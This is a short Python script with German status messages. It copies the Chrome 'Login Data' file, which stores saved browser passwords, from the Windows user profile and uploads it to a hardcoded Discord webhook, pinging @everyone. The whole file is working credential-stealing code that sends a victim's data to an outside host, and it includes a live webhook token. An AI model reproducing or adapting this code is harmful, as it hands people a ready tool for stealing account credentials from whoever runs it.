import requests
import os
WEBHOOK_URL = "https://discord.com/api/webhooks/1411850923193401404/BezCQi_ZQLRhMXASezs841wdyh0eh4a9CEhpXHxmWON8blAFLijuGCOqI0Gr3BSw7ZC9"

user_profile = os.getenv("USERPROFILE")
FILE_PATH = os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

 # anpassen

with open(FILE_PATH, "rb") as f:
    response = requests.post(
        WEBHOOK_URL,
        files={"file": f},
        data={"content": "@everyone"}
    )

if response.status_code == 204:
    print("✅ Datei erfolgreich hochgeladen!")
else:
    print(f"❌ Fehler: {response.status_code} - {response.text}")
